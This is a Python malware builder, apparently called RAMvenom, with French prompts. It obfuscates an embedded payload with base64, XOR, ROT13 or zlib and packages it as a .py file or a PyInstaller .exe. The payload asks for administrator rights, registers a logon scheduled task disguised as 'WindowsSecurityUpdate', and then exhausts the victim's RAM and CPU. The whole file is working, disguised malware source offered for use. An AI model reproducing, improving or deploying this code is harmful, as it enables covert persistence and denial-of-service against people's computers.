import os
import sys
import base64
import getpass
import shutil
import subprocess
import time
from pathlib import Path
import concurrent.futures
import secrets

ascii_start = r"""
______              ______ ______
|  ___|            |___  /|___  /
| |_ ___ _ __ ___     / /    / / 
|  _/ _ \ '__/ _ \   / /    / /  
| ||  __/ | | (_) |./ /___./ /   
\_| \___|_|  \___/ \_____/\_/    
"""

ascii_after_launch = r"""
                                                 __
                                        /\    .-" /
                                       /  ; .'  .' 
                                      :   :/  .'   
                                       \  ;-.'     
                          .--''--..__/     `.    
                        .'           .'    `o  \   
                        /                    `   ;  
                       :                  \      :  
                     .-;        -.         `.__.-'  
                    :  ;          \     ,   ;       
                    '._:           ;   :   (        
                        \/  .__    ;    \   `-.     
                         ;     "-,/_..--"`-..__)    
                         '--.._:
__________    _____      _____                                     
\______   \  /  _  \    /     \___  __ ____   ____   ____   _____  
 |       _/ /  /_\  \  /  \ /  \  \/ // __ \ /    \ /  _ \ /     \ 
 |    |   \/    |    \/    Y    \   /\  ___/|   |  (  <_> )  Y Y  \
 |____|_  /\____|__  /\____|__  /\_/  \___  >___|  /\____/|__|_|  /
        \/         \/         \/          \/     \/             \/ 
"""

RAW_PAYLOAD = """
import ctypes
import os
import subprocess
import sys
from pathlib import Path
import getpass
import concurrent.futures
import secrets


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def run_as_admin():
    script = sys.argv[0]
    params = " ".join([f'"{arg}"' for arg in sys.argv[1:]])
    try:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)
    except Exception:
        pass  
    sys.exit()  


def get_script_path():
    script_path = sys.argv[0]
    if not Path(script_path).exists():
        sys.exit(1)  
    return script_path


def create_startup_task(script_path):
    task_name = "WindowsSecurityUpdate"
    username = getpass.getuser()
    script_path = script_path.replace("\\", "\\\\")  
    command = (
        f'schtasks /Create /F /RL HIGHEST /SC ONLOGON /TN "{task_name}" '
        f'/TR "{script_path}" /RU "{username}"'
    )

    try:
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError:
        sys.exit(1)  


def generer_donnees_alea(taille_mo):
    return secrets.token_bytes(taille_mo * 1024 ** 2)


def attaque_ram(nb_iterations=-1):
    donnees = b''
    iteration = 0
    while nb_iterations < 0 or iteration < nb_iterations:
        donnees += generer_donnees_alea(100)
        iteration += 1


def attaque_cpu():
    while True:
        os.sched_yield()


def main():
    if not is_admin():
        run_as_admin()  

    script_path = get_script_path()  
    create_startup_task(script_path)  

    with concurrent.futures.ThreadPoolExecutor(max_workers=os.cpu_count() * 8) as executor:
        futures_ram = [executor.submit(attaque_ram) for _ in range(100 * os.cpu_count())]

    try:
        for f in concurrent.futures.as_completed(futures_ram):
            f.result()
    except KeyboardInterrupt:
        sys.exit(0)  

    while True:
        attaque_cpu()  


if __name__ == "__main__":
    main()

"""

def encode_base64(payload):
    return base64.b64encode(payload.encode()).decode()

def encode_xor(payload, key=0x42):
    return ''.join(chr(ord(c) ^ key) for c in payload)

def encode_rot13(payload):
    return payload.translate(str.maketrans(
        'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
        'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'))

def encode_zlib(payload):
    import zlib
    return base64.b64encode(zlib.compress(payload.encode())).decode()

def show_start_ascii():
    print(ascii_start)
    time.sleep(3)
    os.system('cls' if os.name == 'nt' else 'clear')

def generate_file(file_name, extension, encoding_choice):
    encoded_payload = ""
    if encoding_choice == 1:
        encoded_payload = encode_base64(RAW_PAYLOAD)
    elif encoding_choice == 2:
        encoded_payload = encode_xor(RAW_PAYLOAD)
    elif encoding_choice == 4:
        encoded_payload = encode_rot13(RAW_PAYLOAD)
    elif encoding_choice == 5:
        encoded_payload = encode_zlib(RAW_PAYLOAD)

    if extension == ".exe":
        create_exe(file_name, encoded_payload)
    elif extension == ".py":
        create_py(file_name, encoded_payload)

def create_exe(file_name, encoded_payload):
    exe_code = f"""
import base64
import os
from io import BytesIO

payload = "{encoded_payload}"
decoded_payload = base64.b64decode(payload)

exec(decoded_payload.decode())
"""
    with open(f"{file_name}.py", "w") as file:
        file.write(exe_code)
    subprocess.run(["pyinstaller", "--onefile", f"{file_name}.py"], check=True)
    exe_path = Path(f"dist/{file_name}.exe")
    if exe_path.exists():
        shutil.move(str(exe_path), Path.home() / "Desktop" / f"{file_name}.exe")

def create_py(file_name, encoded_payload):
    py_code = f"""
import base64

payload = "{encoded_payload}"
decoded_payload = base64.b64decode(payload)

exec(decoded_payload.decode())
"""
    with open(f"{file_name}.py", "w") as file:
        file.write(py_code)

def main():
    show_start_ascii()
    print(ascii_after_launch)
    time.sleep(1)
    file_name = input("Entrez le nom du fichier (sans extension) : ")
    print("Choisissez une extension:")
    print("1. .exe")
    print("2. .py")
    extension_choice = input("Entrez le numéro de l'extension : ")
    encoding_choice = int(input("Choisissez un encodage :\n1. Base64\n2. XOR\n4. ROT13\n5. Zlib\nEntrez le numéro de l'encodage : "))
    extension_map = { "1": ".exe", "2": ".py" }
    selected_extension = extension_map.get(extension_choice, ".py")
    generate_file(file_name, selected_extension, encoding_choice)

if __name__ == "__main__":
    main()
